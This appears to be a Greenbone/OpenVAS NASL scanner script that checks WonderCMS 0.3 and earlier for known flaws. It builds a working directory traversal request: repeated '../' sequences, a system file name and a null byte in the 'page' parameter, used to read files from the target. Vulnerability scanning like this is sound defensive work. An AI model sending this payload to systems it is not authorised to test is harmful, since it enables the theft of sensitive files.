CPE = "cpe:/a:wondercms:wondercms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100908" );
	script_version( "2021-09-02T15:08:26+0000" );
	script_tag( name: "last_modification", value: "2021-09-02 15:08:26 +0000 (Thu, 02 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-11-18 13:10:44 +0100 (Thu, 18 Nov 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "WonderCMS <= 0.3 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wondercms_http_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "wondercms/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "WonderCMS is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "The following vulnerabilities exist:

  - Cross-site scripting (XSS)

  - Information disclosure" );
	script_tag( name: "impact", value: "An attacker may leverage these issues to obtain potentially
  sensitive information and to execute arbitrary script code in the browser of an unsuspecting
  user in the context of the affected site. This may allow the attacker to steal cookie-based
  authentication credentials and to launch other attacks." );
	script_tag( name: "affected", value: "WonderCMS version 0.3 and prior." );
	script_tag( name: "solution", value: "Vendor patch is available. Please see the reference for more
  details." );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44916" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?page=" + crap( data: "../", length: 3 * 9 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

